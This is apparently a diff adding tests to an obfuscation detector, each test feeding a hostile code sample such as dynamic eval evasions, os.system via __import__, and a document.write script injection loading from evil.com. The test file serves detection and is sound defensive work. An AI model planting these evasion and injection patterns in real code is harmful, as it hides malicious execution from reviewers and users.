@@ -205,3 +205,114 @@ def test_binary_file_with_eval_string_skipped():
     root = _make_skill({"lib.so": b"\x7fELFeval(".decode("latin-1")})
     result = run(root)
     assert result.passed
+
+# ── advanced evasion techniques ───────────────────────────────────────────────
+
+def test_marshal_loads_detected():
+    root = _make_skill({"main.py": 'import marshal\nmarshal.loads(bytecode)\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_015" for f in result.findings)
+
+
+def test_string_concat_eval_detected():
+    root = _make_skill({"main.py": 'fn = ("ev" + "al")\nfn(payload)\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_016" for f in result.findings)
+
+
+def test_vars_builtins_evasion_detected():
+    root = _make_skill({"main.py": 'vars()["__builtins__"]["eval"](payload)\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_017" for f in result.findings)
+
+
+def test_globals_builtins_evasion_detected():
+    root = _make_skill({"main.py": 'globals()["__builtins__"]["eval"](payload)\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_018" for f in result.findings)
+
+
+def test_chained_import_system_call_detected():
+    root = _make_skill({"main.py": '__import__("os").system("whoami")\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_019" for f in result.findings)
+
+
+def test_rot13_decode_detected():
+    root = _make_skill({"main.py": 'import codecs\ncodecs.decode("rknp", "rot-13")\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_020" for f in result.findings)
+
+
+def test_document_write_script_injection_detected():
+    root = _make_skill({"index.js": 'document.write("<script src=evil.com/x.js>")\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_021" for f in result.findings)
+
+def test_self_reading_exec_detected():
+    root = _make_skill({"main.py": 'exec(open(__file__).read())\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_022" for f in result.findings)
+
+
+def test_pickle_loads_detected():
+    root = _make_skill({"main.py": 'import pickle\npickle.loads(data)\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_023" for f in result.findings)
+
+
+def test_yaml_load_without_safeloader_detected():
+    root = _make_skill({"main.py": 'import yaml\nyaml.load(data)\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_024" for f in result.findings)
+
+
+def test_yaml_safe_load_passes():
+    root = _make_skill({"main.py": 'import yaml\nyaml.safe_load(data)\n'})
+    result = run(root)
+    assert result.passed
+
+
+def test_atob_detected():
+    root = _make_skill({"index.js": 'const decoded = atob(payload);\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_025" for f in result.findings)
+
+
+def test_breakpoint_abuse_detected():
+    root = _make_skill({"main.py": 'breakpoint()\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_026" for f in result.findings)
+
+
+def test_null_byte_injection_detected():
+    root = _make_skill({"main.py": 'cmd = "ls\\x00-la"\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_027" for f in result.findings)
+
+
+def test_webbrowser_open_detected():
+    root = _make_skill({"main.py": 'import webbrowser\nwebbrowser.open("https://evil.com")\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_028" for f in result.findings)
+
+
+def test_xmlrpc_detected():
+    root = _make_skill({"main.py": 'import xmlrpc.client\n'})
+    result = run(root)
+    assert not result.passed
+    assert any(f.rule_id == "OBFS_029" for f in result.findings)
